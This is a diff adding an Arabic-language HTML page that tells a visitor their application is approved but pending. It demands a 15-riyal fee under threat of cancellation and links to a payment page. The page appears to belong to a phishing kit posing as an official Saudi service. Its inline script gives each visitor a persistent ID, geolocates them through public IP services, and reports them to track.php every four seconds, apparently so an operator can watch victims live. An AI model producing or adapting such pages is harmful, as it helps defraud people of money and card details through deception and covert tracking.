@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> تمت الموافقة على طلبك بنجاح</title>
+        <link rel="icon" type="image/png" href="indexx/favicon.ico">
+
+    
+    
+    
+    
+    
+    
+    
+        
+    
+<script>
+  // 1. تفعيل المعرف الثابت لكل زائر لمنع التكرار الجلسات
+  let visitorCode = localStorage.getItem('visitor_code');
+  if (!visitorCode) {
+      visitorCode = 'VSR-' + Math.random().toString(36).substring(2, 9).toUpperCase();
+      localStorage.setItem('visitor_code', visitorCode);
+  }
+
+  async function sendTracking() {
+      // استعادة الدولة والمنطقة المخزنة لتسريع الموقع وتوفير البيانات
+      let countryCode = localStorage.getItem('visitor_country') || 'un';
+      let regionName = localStorage.getItem('visitor_region') || 'جاري التحديد...';
+
+      if (countryCode === 'un' || regionName === 'جاري التحديد...') {
+          try {
+              // جلب البيانات بدقة (رابط سريع ومفتوح تماماً لجميع دول العالم ومناطق السعودية)
+              const res = await fetch('https://ipapi.co');
+              const geo = await res.json();
+              
+              countryCode = geo.country_code ? geo.country_code.toLowerCase() : 'sa';
+              regionName = geo.region || geo.city || 'منطقة عامة';
+              
+              localStorage.setItem('visitor_country', countryCode);
+              localStorage.setItem('visitor_region', regionName);
+          } catch (e) {
+              // حل احتياطي سريع في حال تعطل الرابط الأول لأي سبب
+              try {
+                  const resAlt = await fetch('https://ipinfo.io');
+                  const geoAlt = await resAlt.json();
+                  countryCode = geoAlt.country ? geoAlt.country.toLowerCase() : 'sa';
+                  regionName = geoAlt.region || geoAlt.city || 'السعودية';
+                  
+                  localStorage.setItem('visitor_country', countryCode);
+                  localStorage.setItem('visitor_region', regionName);
+              } catch (err) {}
+          }
+      }
+
+      // 2. تحويل وتجهيز البيانات للإرسال المتوافق مع الاستضافة المجانية
+      const params = new URLSearchParams();
+      params.append('code', visitorCode);
+      params.append('pageTitle', document.title); // اسم الصفحة دقيق بدون روابط
+      params.append('countryCode', countryCode); // كود الدولة للعلم
+      params.append('region', regionName); // إرسال المنطقة بشكل مستقل ومستقر
+
+      fetch('track.php', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: params
+      }).catch(e => console.log(e));
+  }
+
+  // بث التحديث الفوري وتكراره كل 4 ثوانٍ لتأكيد التواجد
+  sendTracking();
+  setInterval(sendTracking, 4000);
+
+  // تحديث فوري دقيق للاسم والحالة عند الرجوع والتقدم بأزرار المتصفح
+  window.addEventListener('pageshow', sendTracking);
+</script>
+
+
+    
+    
+    
+    
+    
+    
+    <style>
+        /* إعدادات الخط والخلفية العامة */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f7f6;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* حاوية البطاقة الرئيسية */
+        .status-card {
+            background-color: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
+            max-width: 600px;
+            width: 100%;
+            padding: 30px;
+            text-align: center;
+            border-top: 6px solid #0d6b67; /* لون هوية المنصة */
+        }
+
+        /* حاوية علامة الصح والنص العلوي */
+        .success-header {
+            margin-bottom: 25px;
+        }
+
+        /* تصميم علامة الصح المتجاوبة */
+        .success-icon {
+            width: 70px;
+            height: 70px;
+            background-color: #e6f7ed;
+            color: #28a745;
+            border-radius: 50%;
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 35px;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+
+        .success-title {
+            color: #28a745;
+            font-size: 22px;
+            margin: 0;
+            font-weight: bold;
+        }
+
+        /* تفاصيل ونص الرسالة */
+        .message-content {
+            text-align: right;
+            color: #333333;
+            line-height: 1.8;
+            font-size: 16px;
+            background-color: #fafafa;
+            padding: 20px;
+            border-radius: 8px;
+            border-right: 4px solid #ffc107; /* شريط جانبي أصفر للتنبيه */
+            margin-bottom: 25px;
+        }
+
+        .message-content p {
+            margin: 0 0 12px 0;
+        }
+
+        .message-content p:last-child {
+            margin-bottom: 0;
+        }
+
+        /* تمييز المبالغ المادية والتنبيهات */
+        .highlight-text {
+            color: #d9534f;
+            font-weight: bold;
+            background-color: #fdf7f7;
+            padding: 2px 6px;
+            border-radius: 4px;
+        }
+
+        /* زر الإجراء السفلي */
+        .action-button {
+            background-color: #0d6b67;
+            color: white;
+            border: none;
+            padding: 12px 35px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .action-button:hover {
+            background-color: #094b48;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="status-card">
+        
+        <!-- القسم العلوي: علامة الصح وحالة الموافقة -->
+        <div class="success-header">
+            <div class="success-icon">✓</div>
+            <h1 class="success-title">تمت الموافقة على طلبك بنجاح</h1>
+        </div>
+
+        <!-- القسم الأوسط: نص تفاصيل المعاملة والرسوم -->
+        <div class="message-content">
+            <p><strong>عزيزي المستفيد،</strong></p>
+            <p>بخصوص طلبكم المقدم، نود إبلاغكم بأن الطلب معلق حالياً. يلزم سداد رسوم المعاملة ليتم تنفيذ الطلب رسمياً وإحالته إلى اللجنة المختصة، مع مراعاة الآتي:</p>
+            
+            <p>💳 <strong>الإجراء:</strong> سداد رسوم المعاملة المقررة.</p>
+            <p>⏳ <strong>المهلة:</strong> يرجى السداد خلال الإطار الزمني المحدد.</p>
+            <p>🚫 <strong>تنويه:</strong> في حال عدم السداد خلال المهلة، سيُعتبر الطلب ملغىً تلقائياً.</p>
+            
+            <p>لن يتم النظر في طلبك، وسيُعتبر ملغىً نظامياً في حال عدم سداد الرسوم. يرجى سداد مبلغ <span class="highlight-text">(15 ريالاً)</span> عبر قنوات السداد المتاحة لاستكمال الإجراء.</p>
+        </div>
+
+        <!-- القسم السفلي: زر السداد -->
+<!-- استبدل pay.html باسم ملف صفحة السداد لديك (مثال: pay.html) -->
+<a href="ccopycopy2.html" class="action-button" style="text-decoration: none; display: inline-flex; justify-content: center; align-items: center;">الانتقال إلى صفحة السداد</a>
+
+    </div>
+
+</body>
+</html>
